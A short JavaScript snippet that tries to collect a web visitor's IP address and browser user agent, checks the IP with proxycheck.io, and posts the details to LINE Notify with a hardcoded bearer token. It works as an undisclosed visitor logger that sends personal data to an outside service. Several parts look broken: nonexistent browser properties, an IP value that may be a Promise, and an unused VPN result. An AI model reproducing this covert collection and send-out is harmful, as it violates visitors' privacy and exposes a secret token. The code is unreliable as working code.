const fetch = require('node-fetch');

let ipaddress = '';
let browser = '';

if (typeof window !== 'undefined') {
  ipaddress = window?.navigator?.connection?.localAddress ||
    window?.RTCPeerConnection?.generateCertificate()?.then(certificate => {
      const [address] = certificate?.getSubjectAlternativeNames()?.find(entry => entry[0] === 'IP Address') || [];
      return address;
    });
  browser = window?.navigator?.userAgent;
}

const date = new Date().toLocaleString('en-US', { timeZone: 'Asia/Bangkok' });

const url = `https://proxycheck.io/v2/${ipaddress}?vpn=1&asn=1`;
fetch(url)
  .then(response => response.json())
  .then(json => {
    let vpn = '';
    let proxy = '';

    if (json[ipaddress]?.proxy === 'yes') {
      vpn = 'Yes';
    } else {
      vpn = 'No';
    }

    const message = `
      Public IP: ${ipaddress}
      User-Agent: ${browser}
      Time: ${date}
    `;

    const token = 'Y546ghu6YR64iyC6dRG8NpfKfiuvo1HrJwoMnOaghjC';
    notifyMessage(message, token);
  })
  .catch(error => console.log(error));

function notifyMessage(message, token) {
  const lineAPI = 'https://notify-api.line.me/api/notify';

  const headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'Authorization': `Bearer ${token}`,
  };

  const data = new URLSearchParams();
  data.append('message', message);

  fetch(lineAPI, {
    method: 'POST',
    headers,
    body: data,
  })
    .then(response => response.json())
    .then(result => console.log(result))
    .catch(error => console.log(error));
}
